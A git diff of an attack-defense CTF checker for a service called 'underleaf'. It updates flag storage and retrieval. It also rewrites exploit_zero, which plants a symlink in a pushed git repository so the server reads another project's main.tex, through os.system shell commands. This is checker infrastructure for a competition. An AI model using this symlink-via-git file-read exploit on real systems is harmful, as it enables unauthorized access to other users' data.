@@ -4,11 +4,11 @@ import os
 from typing import Optional, Tuple
 from logging import LoggerAdapter
 
-from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, ChainDB
+from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, ChainDB, MumbleException
 from enochecker3.utils import assert_equals, assert_in
 from httpx import AsyncClient, Response, RequestError
 
-service_port = 80
+service_port = 4242
 
 checker = Enochecker("underleaf", service_port)
 app = lambda: checker.app
@@ -134,16 +134,24 @@ async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
     await upload_file(client, id, "main.tex", task.flag, logger)
 
-    return json.dumps({"id": id})
+    return id
 
 @checker.getflag(0)
 async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:    
-    await login_user(client, *await db.get("credentials"))
+    try:
+        (username, password) = await db.get("credentials")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
 
-    (_, id) = await db.get("project")
+    await login_user(client, username, password, logger)
+
+    try:
+        (_, id) = await db.get("project")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
 
 
-    assert_equals(await download_file(client, id, 'main.tex'), task.flag, "flag dose not match")
+    assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")
 
 def os_succ(code):
     if code != 0:
@@ -201,15 +209,9 @@ async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, log
     assert_equals(new_file_content_dl, new_file_content, "file content does not match")
 
 @checker.exploit(0)
-async def exploit_zero(task: ExploitCheckerTaskMessage, clientA: AsyncClient, clientB: AsyncClient, logger: LoggerAdapter) -> None:
-    flag = "FlagGoesHere"
-
-    await register_user(clientB, logger)
-    (_, f_id) = await create_project(clientB, logger)
-    await upload_file(clientB, f_id, "flag", flag, logger)
-
-    (username, password, _) = await register_user(clientA, logger)
-    (_, id) = await create_project(clientA, logger)
+async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
+    (username, password, _) = await register_user(client, logger)
+    (_, id) = await create_project(client, logger)
 
     dev_null = "  > /dev/null 2>&1"
 
@@ -224,7 +226,9 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, clientA: AsyncClient, cl
     assert_equals(os.path.exists(f"/tmp/{id}/main.tex"), True, "file not created")
 
     # add a symlink
-    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/flag"
+    f_id = task.attack_info
+
+    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
     os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
     os_succ(os.system(f"touch {target} {dev_null}"))
     os_succ(os.system(f"ln -s {target} /tmp/{id}/link"))
@@ -245,13 +249,10 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, clientA: AsyncClient, cl
     os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))
 
     # let the server pull the changes
-    await pull(clientA, id, logger)
+    await pull(client, id, logger)
 
     # get flag
-    fdl = await download_file(clientA, id, "link", logger)
-    assert_equals(fdl, flag, "flag dose not match")
-
-    return fdl
+    return await download_file(client, id, "link", logger)    
 
 
 if __name__ == "__main__":
